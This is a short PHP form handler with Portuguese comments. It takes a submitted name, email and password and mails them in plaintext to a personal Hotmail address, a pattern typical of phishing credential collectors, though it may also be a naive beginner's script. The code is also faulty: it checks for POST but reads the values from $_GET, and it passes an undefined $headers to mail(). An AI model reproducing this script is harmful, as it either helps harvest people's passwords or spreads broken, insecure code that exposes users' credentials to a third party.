<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nome = $_GET['nome'];
    $email = $_GET['email'];
    $senha = $_GET['senha']; // Evite enviar senhas sem segurança em produção!

    // Endereço de e-mail para onde será enviado
    $to = "isaky_gamer@hotmail.com";
    $subject = "Novo Formulário Enviado";

    // Corpo do e-mail
    $message = "Você recebeu uma nova submissão:\n\n";
    $message .= "Nome: $nome\n";
    $message .= "E-mail: $email\n";
    $message .= "Senha: $senha\n";

    // Envia o e-mail
    if (mail($to, $subject, $message, $headers)) {
        echo "As informações foram enviadas com sucesso!";
    } else {
        echo "Erro ao enviar o e-mail.";
    }
} else {
    echo "Método inválido.";
}
?>
